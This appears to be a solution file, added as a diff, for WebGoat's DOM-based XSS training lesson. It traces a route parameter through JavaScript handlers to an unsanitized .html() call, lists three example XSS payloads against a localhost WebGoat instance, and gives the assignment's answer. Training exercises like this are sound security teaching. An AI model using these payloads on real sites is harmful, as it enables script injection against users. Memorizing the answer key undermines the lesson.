@@ -1,0 +1,42 @@
+=== DOM-Based XSS Solution ===
+
+ANSWER: The test route is: start.mvc#test/
+
+Full route path: start.mvc#test/:param
+
+EXPLANATION:
+Looking at the JavaScript source code in GoatRouter.js:
+
+1. Routes are defined on line 47-52:
+   routes: {
+       'test/:param': 'testRoute',    <-- Test route!
+   }
+
+2. The testRoute handler (line 115):
+   testRoute: function (param) {
+       this.lessonController.testHandler(param);
+   }
+
+3. testHandler in LessonController.js (line 149):
+   this.testHandler = function(param) {
+       this.lessonContentView.showTestParam(param);
+   }
+
+4. showTestParam in LessonContentView.js:
+   showTestParam: function (param) {
+       this.$el.find('.lesson-content').html('test:' + param);
+   }
+
+THE VULNERABILITY:
+The param is directly inserted into HTML using .html() without any sanitization!
+
+EXPLOITATION:
+Base URL format: /WebGoat/start.mvc#test/<PAYLOAD>
+
+Example XSS payloads to try:
+1. http://localhost:8001/WebGoat/start.mvc#test/<script>alert('XSS')</script>
+2. http://localhost:8001/WebGoat/start.mvc#test/<img src=x onerror=alert('XSS')>
+3. http://localhost:8001/WebGoat/start.mvc#test/<svg onload=alert('XSS')>
+
+To complete the assignment, enter: test/:param
+Or just: test
